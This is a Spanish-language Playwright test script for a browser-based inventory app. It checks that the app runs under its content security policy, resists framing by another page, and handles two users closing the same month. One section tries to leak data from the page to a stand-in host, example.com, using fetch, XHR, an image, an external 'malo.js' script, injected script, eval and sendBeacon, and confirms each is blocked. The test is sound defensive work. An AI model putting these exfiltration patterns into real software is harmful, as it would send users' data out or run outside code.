/* Prueba de seguridad y de trabajo a la par en Chromium. Uso: node e2e_seguridad.js <carpeta_archivos> <carpeta_salida> <html> */
'use strict';
const { chromium } = require('playwright');
const fs = require('fs'), path = require('path');
const [dir, out, html] = process.argv.slice(2);
const APP = html.startsWith('http') ? html : 'file://' + path.resolve(html);
const f = re => path.join(dir, fs.readdirSync(dir).find(n => re.test(n)));
(async () => {
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ acceptDownloads: true });
  const page = await ctx.newPage();
  const errs = [], csp = [], salidas = [];
  page.on('pageerror', e => errs.push(e.message));
  page.on('console', m => { if (/Content Security Policy|Refused/i.test(m.text())) csp.push(m.text().slice(0, 140)); });
  page.on('request', r => { if (!/^(file|data|blob|about):/.test(r.url()) && r.url() !== APP) salidas.push(r.url()); });
  const bajadas = []; page.on('download', d => bajadas.push(d));
  const llegaron = [], bloqueadosCSP = [];
  await ctx.route('https://example.com/**', r => { llegaron.push(r.request().url()); r.fulfill({ status: 200, body: 'ok', headers: { 'access-control-allow-origin': '*' } }); });
  page.on('requestfailed', r => { if (/example\.com/.test(r.url())) bloqueadosCSP.push(r.failure() && r.failure().errorText); });
  const cargar = async files => { const n = await page.evaluate(() => +(document.body.dataset.lecturas || 0)); await page.setInputFiles('#file', files); await page.waitForFunction(n => +(document.body.dataset.lecturas || 0) > n, n, { timeout: 180000 }); };
  const calc = async () => { const n = await page.evaluate(() => +(document.body.dataset.calculos || 0)); await page.click('#calcular'); await page.waitForFunction(n => +(document.body.dataset.calculos || 0) > n, n, { timeout: 180000 }); };
  await page.goto(APP);

  // 1) La app funciona completa con la política activa (lectura, cálculo y descarga)
  await cargar([f(/^ec51801c/), f(/^d994b313/), f(/^1f493c53/), f(/^8ab5bd2f/), f(/C_digos_EN_GRAL/)]);
  await page.selectOption('#sede', '__nueva'); await page.waitForSelector('#nGuardar');
  await page.fill('#nNombre', 'Cámara del Trabajo - Río Cuarto'); await page.fill('#nCorto', 'Rio Cuarto prueba'); await page.click('#nGuardar');
  await calc();
  console.log('1) con la protección activa: stock', await page.evaluate(() => window.__stockApp.borrador.resumen.stock), '· a revisar', await page.evaluate(() => window.__stockApp.borrador.consolidado.filter(x => x.revisar).length));
  await page.fill('#autor', 'Fede'); await page.click('#confirmar');
  let t0 = Date.now(); while (bajadas.length < 2 && Date.now() - t0 < 60000) await new Promise(r => setTimeout(r, 200));
  const baseFede = path.join(out, bajadas[0].suggestedFilename()); await bajadas[0].saveAs(baseFede);
  console.log('   descarga con autor en el nombre:', bajadas.map(d => d.suggestedFilename()).join(' · '));

  // 2) Intentos de sacar datos: todos bloqueados
  const intentos = await page.evaluate(async () => {
    const r = {};
    try { await fetch('https://example.com/robar?d=1'); r.fetch = 'SALIÓ'; } catch (e) { r.fetch = 'bloqueado'; }
    try { const x = new XMLHttpRequest(); x.open('GET', 'https://example.com'); x.send(); await new Promise(z => setTimeout(z, 300)); r.xhr = x.status ? 'SALIÓ' : 'bloqueado'; } catch (e) { r.xhr = 'bloqueado'; }
    await new Promise(z => { const i = new Image(); i.onload = () => { r.img = 'SALIÓ'; z(); }; i.onerror = () => { r.img = 'bloqueado'; z(); }; i.src = 'https://example.com/x.png'; });
    await new Promise(z => { const s = document.createElement('script'); s.src = 'https://example.com/malo.js'; s.onload = () => { r.scriptExterno = 'CARGÓ'; z(); }; s.onerror = () => { r.scriptExterno = 'bloqueado'; z(); }; document.head.appendChild(s); });
    const s2 = document.createElement('script'); s2.textContent = 'window.__inyectado = 1'; document.head.appendChild(s2); r.scriptInyectado = window.__inyectado ? 'CORRIÓ' : 'bloqueado';
    try { eval('1'); r.eval = 'CORRIÓ'; } catch (e) { r.eval = 'bloqueado'; }
    r.beacon = navigator.sendBeacon ? (navigator.sendBeacon('https://example.com/b', 'x') ? 'encolado' : 'bloqueado') : 'no existe';
    return r;
  });
  await page.waitForTimeout(500);
  console.log('2) intentos de salida:', JSON.stringify(intentos));
  console.log('   pedidos que llegaron al servidor simulado:', llegaron.length ? llegaron : 'ninguno', '· motivos de falla:', [...new Set(bloqueadosCSP)].join(', ') || '—');
  // Control: la misma prueba en una página SIN la protección, para demostrar que el servidor simulado sí recibe
  const ctl = await ctx.newPage(); await ctl.goto('file:///dev/null').catch(() => {}); await ctl.setContent('<p>control</p>');
  await ctl.evaluate(async () => { try { await fetch('https://example.com/control'); } catch (e) {} });
  console.log('   control sin protección, llegó al servidor:', llegaron.some(u => /control/.test(u)));

  // 3) Dentro de un marco de otra página: no se muestra
  // Otra página (otro origen) que intenta mostrar la app dentro de un marco
  const http = require('http');
  const otra = http.createServer((q, r) => { r.setHeader('content-type', 'text/html'); r.end(`<!doctype html><title>otra</title><iframe src="${APP}" width="800" height="600"></iframe>`); });
  await new Promise(r => otra.listen(8766, r));
  const fr = await browser.newPage();
  await fr.goto('http://127.0.0.1:8766/').catch(() => {});
  await fr.waitForTimeout(2500);
  const fr2 = fr.frames().find(x => x !== fr.mainFrame());
  let vis = 'sin marco';
  if (fr2) vis = await Promise.race([fr2.evaluate(() => getComputedStyle(document.documentElement).display).catch(e => 'error'), new Promise(r => setTimeout(() => r('sin respuesta'), 3000))]);
  console.log('3) incrustada en otra página: contenido del marco', vis === 'none' ? 'OCULTO' : vis, '· la pestaña quedó en', fr.url());
  await fr.close(); otra.close();

  // 4) Trabajo a la par: dos personas cierran el mismo mes desde la misma base
  async function cerrarComo(quien) {
    const p = await (await browser.newContext({ acceptDownloads: true })).newPage(); const bj = []; p.on('download', d => bj.push(d));
    await p.goto(APP);
    const n = await p.evaluate(() => +(document.body.dataset.lecturas || 0));
    await p.setInputFiles('#file', [baseFede, f(/^ec51801c/), f(/^d994b313/), f(/^1f493c53/), f(/^8ab5bd2f/)]);
    await p.waitForFunction(n => +(document.body.dataset.lecturas || 0) > n, n, { timeout: 180000 });
    await p.fill('#corte', quien === 'Ana' ? '2026-11-30' : '2026-11-29');
    const m = await p.evaluate(() => +(document.body.dataset.calculos || 0)); await p.click('#calcular'); await p.waitForFunction(m => +(document.body.dataset.calculos || 0) > m, m);
    await p.fill('#autor', quien); await p.click('#confirmar');
    const t = Date.now(); while (bj.length < 2 && Date.now() - t < 60000) await new Promise(r => setTimeout(r, 200));
    const ruta = path.join(out, bj[0].suggestedFilename()); await bj[0].saveAs(ruta); await p.context().close(); return ruta;
  }
  const bAna = await cerrarComo('Ana'), bFede2 = await cerrarComo('Fede');
  console.log('4) dos cierres N° 2:', path.basename(bAna), '·', path.basename(bFede2));
  await page.goto(APP);
  await cargar([baseFede, bAna, bFede2]);
  console.log('   al cargar las tres bases:', (await page.$eval('#baseInfo', e => e.innerText.replace(/\s+/g, ' '))).slice(0, 330));
  console.log('   ¿se puede calcular?', !(await page.$eval('#p3', e => e.classList.contains('inactivo'))));
  await page.click('[data-elegir="0"]');
  console.log('   tras elegir una:', (await page.$eval('#baseInfo', e => e.innerText.replace(/\s+/g, ' '))).slice(0, 200));
  await cargar([baseFede, bAna]);
  console.log('   base anterior + una nueva:', (await page.$eval('#baseInfo', e => e.innerText.replace(/\s+/g, ' '))).slice(0, 260));

  console.log('Errores de la página:', errs.length ? errs : 'ninguno');
  console.log('Bloqueos registrados por la política:', csp.length);
  await browser.close();
})().catch(e => { console.error(e); process.exit(1); });
